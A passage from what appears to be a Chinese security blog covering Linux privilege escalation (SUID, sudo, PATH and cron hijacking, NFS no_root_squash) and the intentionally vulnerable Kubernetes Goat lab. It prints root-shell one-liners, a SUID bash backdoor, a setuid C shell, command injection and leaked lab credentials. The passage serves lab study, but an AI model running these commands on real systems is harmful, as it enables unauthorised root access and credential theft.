&#x2F;bin&#x2F;sh -p 3、ip netns delete foo</td></tr><tr><td>ionice</td><td>ionice &#x2F;bin&#x2F;sh -p</td></tr><tr><td>git</td><td>git help status</td></tr><tr><td>gimp</td><td>gimp -idf –batch-interpreter&#x3D;python-fu-eval -b ‘import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’</td></tr><tr><td>gdb</td><td>gdb -nx -ex ‘python import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’ -ex quit</td></tr><tr><td>ftp</td><td>ftp &#x2F;&#x2F;在底行输入”!&#x2F;bin&#x2F;sh -p”</td></tr><tr><td>flock</td><td>flock -u &#x2F; &#x2F;bin&#x2F;sh -p</td></tr><tr><td>find</td><td>find . &#x2F; -exec “&#x2F;bin&#x2F;sh” -p</td></tr><tr><td>expect</td><td>expect -c ‘spawn &#x2F;bin&#x2F;sh -p;interact’</td></tr><tr><td>env</td><td>env &#x2F;bin&#x2F;sh -p</td></tr><tr><td>ed</td><td>ed &#x2F;&#x2F;在底行输入”!&#x2F;bin&#x2F;sh -p”</td></tr><tr><td>docker</td><td>docker run -v &#x2F;:&#x2F;mnt –rm -it alpine chroot &#x2F;mnt sh</td></tr><tr><td>dmesg</td><td>dmesg -H&#x2F;&#x2F;在底行输入”!&#x2F;bin&#x2F;sh -p”</td></tr><tr><td>csh</td><td>csh -b</td></tr><tr><td>bash</td><td>bash -p</td></tr><tr><td>awk</td><td>awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash -p”)}’</td></tr><tr><td>perl</td><td>perl exec “&#x2F;bin&#x2F;bash”;</td></tr><tr><td>Vi&#x2F;Vim</td><td>vim.basic &#x2F;etc&#x2F;passwd 添加一个新的用户条目或修改现有用户条目的密码哈希，然后保存并退出。格式：newuser:$6$salt$hash:uid:gid:GECOS:home:shell 保存修改后的&#x2F;etc&#x2F;passwd文件，并以新用户身份登录或使用su命令切换到新用户。</td></tr><tr><td>cp</td><td>cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash &#x2F;&#x2F;覆盖&#x2F;bin&#x2F;bash来创建一个后门 ;chmod u+s &#x2F;tmp&#x2F;bash;执行&#x2F;tmp&#x2F;bash -p可以获取一个root权限的shell</td></tr></tbody></table><p>确定要用的指令(以gdb为例)，并输入利用指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br></pre></td></tr></table></figure><h2 id="2，SUDO提权"><a href="#2，SUDO提权" class="headerlink" title="2，SUDO提权"></a>2，SUDO提权</h2><p>SUDO权限是root把本来只能超级用户执行的命令赋予普通用户执行，系统管理员集中的管理用户使用权限和使用主机，配置文件：&#x2F;etc&#x2F;sudoers</p><h2 id="3，PATH提权"><a href="#3，PATH提权" class="headerlink" title="3，PATH提权"></a>3，PATH提权</h2><p>需要结合SUID提权<br>以一个靶场为例：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-04%20221045.png"><br>当那些shell后，查找SUID存在第三方文件<br>&#x2F;opt&#x2F;statuscheck</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span>s /opt/statuscheck <span class="comment">//查看文件中含有的字符串</span></span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-04%20221553.png"><br>&#x2F;opt&#x2F;statuscheck存在执行<br>利用方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/sh&quot; &gt; curl  # 在tmp目录下创建curl文件，包含“/bin/sh”</span><br><span class="line">chmod 777 curl  # 赋予权限</span><br><span class="line">export PATH=/tmp:$PATH  # 将/tmp添加到环境变量中，可以让系统不会执行默认的curl工具</span><br><span class="line">echo $PATH</span><br><span class="line">/opt/statuscheck   #执行文件触发curl</span><br></pre></td></tr></table></figure><p>根据此靶场就好理解了，将原生的内容劫持后，执行自己添加的到环境的内容</p><h2 id="4，PATH劫持"><a href="#4，PATH劫持" class="headerlink" title="4，PATH劫持"></a>4，PATH劫持</h2><p>查看定时任务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure><p>发现定义了诸多环境变量，如果其任务有 未指定绝对路径的指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@izjf ~]# cat /etc/crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATTH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br></pre></td></tr></table></figure><p>发现定义了诸多环境变量，如果其任务有 未指定绝对路径的指令，如</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*    * * *   root    <span class="keyword">shell</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p>而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持。</p><p>找到可写目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>比如在 &#x2F;sbin 写入一个 反弹 shell 功能的 shell.sh，那么就可以造成提权。</p><h2 id="4，定时任务提权"><a href="#4，定时任务提权" class="headerlink" title="4，定时任务提权"></a>4，定时任务提权</h2><p>定时任务（cron job）可以用来设置周期执行的命令，提权的原理为计划任务以root权限运行，计划任务中的脚本其他用户有写入的权限，或者脚本所属组为其他用户，则可以进行计划任务提权。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br></pre></td></tr></table></figure><p>如果我们有幸有权限能更改其中一个任务指定的脚本，就可以往脚本里添加如反弹 shell 等指令，从而提权.</p><h2 id="5，NFS提权"><a href="#5，NFS提权" class="headerlink" title="5，NFS提权"></a>5，NFS提权</h2><p>NFS 是一种运行在端口 2049 上的网络文件共享协议，由服务器和客户端两个组件组成。共享目录是在 NFS 服务器上创建的，以便可以通过网络与其他 Linux 客户端共享文件，获得许可的用户可以将文件添加到共享中，然后与有权访问该目录的其他用户共享。</p><p>默认情况下，每个 NFS 共享均启用了 root_squash 功能，用以防止被共享的文件拥有 root:root 身份或特殊权限（即启用 root_squash 之后，共享文件均是 nobody:nogroup 身份）。而如果启用了 no_root_squash 功能，那么共享文件就可以以 root 的身份存在，我们将在本篇文章中看到，这很容易导致权限升级。</p><p>枚举 NFS 共享：<br>1，使用 Nmap 枚举 NFS 共享<br>2，使用 showmount 命令进行枚举</p><p>挂载 NFS 共享：<br>我们需要做的第一件事是在攻击者机器上创建一个挂载点，以便与共享进行交互。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /mnt/nfs</span><br></pre></td></tr></table></figure><p>创建挂载点后，我们就可以挂载共享并将其链接到挂载点。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 192.168.1.5:/mnt/nfs ./nfs  #攻击机执行</span><br></pre></td></tr></table></figure><p>成功后，只要往本机的nfs文件放内容，对方的nfs上也会实时同步<br>利用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(root@kali)-[~/nfs]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> /usr/bin/find shell //将find命令拷贝到shell中</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">chmod</span> 777 shell//赋予权限</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">chmod</span> +s shell//赋予suid权限</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/mnt/nfs/shell . / -exec &quot;/bin/sh&quot; -p;quit //进行提权</span><br></pre></td></tr></table></figure><p>注意：系统不同find命令也会不同，导致运行出错<br>解决：<br>1，用相同的系统拷贝&#x2F;usr&#x2F;bin&#x2F;find<br>2，写一个c语言进行调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stido.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将shell.c编译成可执行文件，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc shell.c -o getshell</span><br></pre></td></tr></table></figure><p>赋SUID权限，再传入nfs中。</p><p>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">bin</span>/python3</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">        os.system(<span class="string">&quot;thm&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kubernetes-goat靶场</title>
      <link href="/2025/06/17/kubernetes-goat%E9%9D%B6%E5%9C%BA/"/>
      <url>/2025/06/17/kubernetes-goat%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="kubernetes-goat靶场"><a href="#kubernetes-goat靶场" class="headerlink" title="kubernetes-goat靶场"></a>kubernetes-goat靶场</h1><p>Kubernetes Goat 被设计成一个故意设置易受攻击的集群环境，用于学习和实践 Kubernetes 安全性</p><p>安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/madhuakula/kubernetes-goat.git</span><br><span class="line">cd kubernetes-goat</span><br><span class="line">chmod +x setup-kubernetes-goat.sh</span><br><span class="line">bash setup-kubernetes-goat.sh</span><br></pre></td></tr></table></figure><p>运行访问脚本之前，确保 Pod 正在运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods</span><br></pre></td></tr></table></figure><p>通过以下命令将资源公开到本地系统（端口转发）来访问 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash access-kubernetes-goat.sh</span><br></pre></td></tr></table></figure><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><ul><li>1.代码库中的敏感密钥</li><li>2.IND（docker-in-docker）利用</li><li>3.Kubernetes（K8S）世界中的SSRF</li><li>4.容器逃逸到主机系统</li><li>5.Docker CIS 基准分析</li><li>6.Kubernetes CIS 基准分析</li><li>7.攻击私人注册中心</li><li>8.NodePort 暴露服务</li><li>9.使用 Helm v2 Tiller 来攻克集群 - [已弃用]</li><li>10.分析加密货币矿工容器</li><li>11.Kubernetes 命名空间绕过</li><li>12.获取环境信息</li><li>13.对内存&#x2F;CPU 资源进行 DoS</li><li>14.黑客容器预览</li><li>15.层层隐藏</li><li>16.RBAC 最小权限配置错误</li><li>17.KubeAudit - 审计 Kubernetes 集群</li><li>18.Falco - 运行时安全监控和检测</li><li>19.Popeye - Kubernetes 集群清理工具</li><li>20.使用 NSP 保护网络边界</li><li>21.Cilium Tetragon - 基于 eBPF 的安全可观察性和运行时执行</li><li>22.使用 Kyverno 策略引擎保护 Kubernetes 集群</li></ul><p>参考：<a href="https://madhuakula.com/kubernetes-goat">https://madhuakula.com/kubernetes-goat</a></p><h2 id="一，代码库中的敏感密钥"><a href="#一，代码库中的敏感密钥" class="headerlink" title="一，代码库中的敏感密钥"></a>一，代码库中的敏感密钥</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>开发人员倾向于将敏感信息提交给版本控制系统。当我们转向 CI&#x2F;CD 和 GitOps 系统时，我们往往会忘记识别代码和提交中的敏感信息。让我们看看能不能在这里找到一些很酷的东西！<br>访问1230端口。</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-20%20204507.png"></p><p>使用gobuster爆破目录，找到&#x2F;.git&#x2F;HEAD</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 30 -u http://127.0.0.1:1230</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.1.0</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.32.130:1230</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 30</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">/.git/HEAD            (Status: 200) [Size: 23]</span><br><span class="line">/ping                 (Status: 200) [Size: 4] </span><br></pre></td></tr></table></figure><p>使用git-dumper下载源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git-dumper http://192.168.200.143:1230/ k8s</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-<span class="selector-attr">[~]</span></span><br><span class="line">└─$ git-dumper http:<span class="comment">//192.168.200.143:1230/ k8s</span></span><br><span class="line"><span class="selector-attr">[-]</span> Testing http:<span class="comment">//192.168.200.143:1230/.git/HEAD [200]</span></span><br><span class="line"><span class="selector-attr">[-]</span> Testing http:<span class="comment">//192.168.200.143:1230/.git/ [404]</span></span><br><span class="line"><span class="selector-attr">[-]</span> Fetching common files</span><br><span class="line"><span class="selector-attr">[-]</span> Fetching http:<span class="comment">//192.168.200.143:1230/.gitignore [404]</span></span><br><span class="line"><span class="selector-attr">[-]</span> http:<span class="comment">//192.168.200.143:1230/.gitignore responded with status code 404</span></span><br><span class="line"><span class="selector-attr">[-]</span> Fetching http:<span class="comment">//192.168.200.143:1230/.git/hooks/post-commit.sample [404]</span></span><br></pre></td></tr></table></figure><p>进入下载的 git 存储库文件夹进行分析</p><p>我们可以通过查看日志和以前的提交历史来验证 git 历史记录和信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>k8s]</span><br><span class="line">└─$ git log                                    </span><br><span class="line"><span class="keyword">commit</span> <span class="number">905</span>dcec070d86ce60822d790492d7237884df60a (HEAD <span class="operator">-</span><span class="operator">&gt;</span> master)</span><br><span class="line">Author: Madhu Akula <span class="operator">&lt;</span>madhu.akula<span class="variable">@hotmail</span>.com<span class="operator">&gt;</span></span><br><span class="line"><span class="type">Date</span>:   Fri Nov <span class="number">6</span> <span class="number">23</span>:<span class="number">42</span>:<span class="number">28</span> <span class="number">2020</span> <span class="operator">+</span><span class="number">0100</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Final</span> <span class="keyword">release</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">commit</span> <span class="number">3292</span>ff3bd8d96f192a9d4eb665fdd1014d87d3df</span><br><span class="line">Author: Madhu Akula <span class="operator">&lt;</span>madhu.akula<span class="variable">@hotmail</span>.com<span class="operator">&gt;</span></span><br><span class="line"><span class="type">Date</span>:   Fri Nov <span class="number">6</span> <span class="number">23</span>:<span class="number">40</span>:<span class="number">59</span> <span class="number">2020</span> <span class="operator">+</span><span class="number">0100</span></span><br><span class="line"></span><br><span class="line">    Updated the docs</span><br><span class="line"></span><br><span class="line"><span class="keyword">commit</span> <span class="number">7</span>daa5f4cda812faa9c62966ba57ee9047ee6b577</span><br><span class="line">Author: Madhu Akula <span class="operator">&lt;</span>madhu.akula<span class="variable">@hotmail</span>.com<span class="operator">&gt;</span></span><br><span class="line"><span class="type">Date</span>:   Fri Nov <span class="number">6</span> <span class="number">23</span>:<span class="number">39</span>:<span class="number">21</span> <span class="number">2020</span> <span class="operator">+</span><span class="number">0100</span></span><br><span class="line"></span><br><span class="line">    updated the endpoints <span class="keyword">and</span> routes</span><br><span class="line"></span><br><span class="line"><span class="keyword">commit</span> d7c173ad183c574109cd5c4c648ffe551755b576</span><br><span class="line">Author: Madhu Akula <span class="operator">&lt;</span>madhu.akula<span class="variable">@hotmail</span>.com<span class="operator">&gt;</span></span><br><span class="line"><span class="type">Date</span>:   Fri Nov <span class="number">6</span> <span class="number">23</span>:<span class="number">31</span>:<span class="number">06</span> <span class="number">2020</span> <span class="operator">+</span><span class="number">0100</span></span><br><span class="line"></span><br><span class="line">    Inlcuded custom environmental variables</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">commit</span> d7c173ad183c574109cd5c4c648ffe551755b576</span><br><span class="line"><span class="attribute">Author</span>: Madhu Akula &lt;madhu.akula@hotmail.com&gt;</span><br><span class="line"><span class="attribute">Date</span>:   Fri Nov <span class="number">6</span> <span class="number">23</span>:<span class="number">31</span>:<span class="number">06</span> <span class="number">2020</span> +<span class="number">0100</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">Inlcuded</span> custom environmental variables</span><br></pre></td></tr></table></figure><p>出现一个有意思的内容</p><p>可以使用以下命令，并输入提交 ID 来查看某个提交</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout d7c173ad183c574109cd5c4c648ffe551755b576</span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/k8s]</span><br><span class="line">└─$ git checkout d7c173ad183c574109cd5c4c648ffe551755b576</span><br><span class="line">Note: switching <span class="built_in">to</span> <span class="string">&#x27;d7c173ad183c574109cd5c4c648ffe551755b576&#x27;</span>.</span><br><span class="line"></span><br><span class="line">You are <span class="keyword">in</span> <span class="string">&#x27;detached HEAD&#x27;</span> state. You can look around, make experimental</span><br><span class="line">changes <span class="keyword">and</span> commit them, <span class="keyword">and</span> you can discard <span class="keyword">any</span> commits you make <span class="keyword">in</span> this</span><br><span class="line">state <span class="keyword">without</span> impacting <span class="keyword">any</span> branches <span class="keyword">by</span> switching back <span class="built_in">to</span> <span class="keyword">a</span> branch.</span><br><span class="line"></span><br><span class="line">If you want <span class="built_in">to</span> <span class="built_in">create</span> <span class="keyword">a</span> <span class="built_in">new</span> branch <span class="built_in">to</span> retain commits you <span class="built_in">create</span>, you may</span><br><span class="line"><span class="built_in">do</span> so (now <span class="keyword">or</span> later) <span class="keyword">by</span> <span class="keyword">using</span> -c <span class="keyword">with</span> <span class="keyword">the</span> <span class="keyword">switch</span> command. Example:</span><br><span class="line"></span><br><span class="line">  git <span class="keyword">switch</span> -c &lt;<span class="built_in">new</span>-branch-name&gt;</span><br><span class="line"></span><br><span class="line">Or undo this operation <span class="keyword">with</span>:</span><br><span class="line"></span><br><span class="line">  git <span class="keyword">switch</span> -</span><br><span class="line"></span><br><span class="line">Turn off this advice <span class="keyword">by</span> setting config <span class="built_in">variable</span> advice.detachedHead <span class="built_in">to</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">HEAD is now <span class="keyword">at</span> d7c173a Inlcuded custom environmental variables</span><br></pre></td></tr></table></figure><p>现在我们进入了特定的提交历史记录，可以看到该提交中的所有文件、代码、资源和更改。我们可以使用标准的 Linux 实用程序来探索文件系统，看看是否有任何有趣的文件或更改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/k8s]</span><br><span class="line">└─$ ls -la</span><br><span class="line">total 32</span><br><span class="line">drwxrwxr-x <span class="number"> 3 </span>kali kali<span class="number"> 4096 </span>May<span class="number"> 22 </span>00:05 .</span><br><span class="line">drwx------<span class="number"> 17 </span>kali kali<span class="number"> 4096 </span>May<span class="number"> 22 </span>00:01 ..</span><br><span class="line">-rw-rw-r-- <span class="number"> 1 </span>kali kali <span class="number"> 182 </span>May<span class="number"> 22 </span>00:05 .env</span><br><span class="line">drwxrwxr-x <span class="number"> 7 </span>kali kali<span class="number"> 4096 </span>May<span class="number"> 22 </span>00:05 .git</span><br><span class="line">-rw-rw-r-- <span class="number"> 1 </span>kali kali  <span class="number"> 76 </span>May<span class="number"> 22 </span>00:05 go.mod</span><br><span class="line">-rw-rw-r-- <span class="number"> 1 </span>kali kali<span class="number"> 2432 </span>May<span class="number"> 22 </span>00:05 go.sum</span><br><span class="line">-rw-rw-r-- <span class="number"> 1 </span>kali kali <span class="number"> 284 </span>May<span class="number"> 22 </span>00:05 main.go</span><br><span class="line">-rw-rw-r-- <span class="number"> 1 </span>kali kali  <span class="number"> 95 </span>May<span class="number"> 22 </span>00:05 README.md</span><br></pre></td></tr></table></figure><p>现在我们可以看到一个有趣的点文件，它看起来相当可疑，因为大多数开发人员将环境变量和密钥存储在类似的文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .env</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/k8s]</span><br><span class="line">└─$ <span class="built_in">cat</span> .<span class="built_in">env</span></span><br><span class="line">[build-code-aws]</span><br><span class="line">aws_access_key_id = AKIVSHD6243H22G1KIDC</span><br><span class="line">aws_secret_access_key = cgGn4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1M</span><br><span class="line">k8s_goat_flag = k8s-goat-51bc78332065561b0c99280f62510bcc</span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>有时，理想情况下，我们可以访问 Pod、容器，作为审计的一部分，或者由于其他一些漏洞，我们也可以使用不同的方法来解决或实现这一</p><p>我们可以使用以下命令exec进入 pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export POD_NAME=$(kubectl get pods --namespace default -l &quot;app=build-code&quot; -o jsonpath=&quot;&#123;.items[0].metadata.name&#125;&quot;)</span><br><span class="line"></span><br><span class="line">kubectl exec -it $POD_NAME -- sh</span><br></pre></td></tr></table></figure><p>**提示：**我们可以使用TruffleHog等开源实用程序而不是手动分析来在 git 提交&#x2F;历史记录中找到泄露的凭据。</p><p>它包含.git文件夹，我们可以trufflehog通过运行以下命令来执行分析</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trufflehog .</span><br></pre></td></tr></table></figure><h2 id="Docker-in-Docker的漏洞利用"><a href="#Docker-in-Docker的漏洞利用" class="headerlink" title="Docker-in-Docker的漏洞利用"></a>Docker-in-Docker的漏洞利用</h2><ul><li>将学习测试和利用容器 UNIX 套接字错误配置</li><li>能够利用容器并从docker容器中逃逸</li></ul><p>此场景的目标是从正在运行的 docker 容器中跳转到运行该容器的主机系统，并能够访问在同一节点上运行的其他容器并对其执行操作。<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20003003.png"></p><p>通过查看应用程序功能并尝试输入和输出，我们发现它存在标准命令注入漏洞。假设它在 Linux 容器中运行，我们可以使用;分隔符来运行&#x2F;传递其他命令。</p><h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><p>大多数使用Docker和在管道中为构建容器的CI &#x2F; CD和管道系统使用称为DIND(docker-in-docker)。在这种情况下,我们尝试利用并访问主机系统。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1; id</span><br></pre></td></tr></table></figure><p>我们可以看到它返回了命令的响应id，现在我们可以分析系统并查看可以获得哪些潜在信息</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; mount</span></span><br></pre></td></tr></table></figure><p>它包含containerd.sock安装到文件系统中，因为它在标准系统中并不常见<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20003447.png"></p><p>我们可以看到它&#x2F;custom&#x2F;containerd&#x2F;containerd.sock已挂载在文件系统中，假设它是从主机系统挂载的，我们需要与它进行通信，以便与 UNIX 套接字进行通信</p><p>我们可以使用多种方法与 UNIX 套接字通信containerd.sock。其中一些包括crictl 二进制文件，或者一个简单的curl程序。</p><p>我们可以crictl从互联网上下载静态二进制文件<a 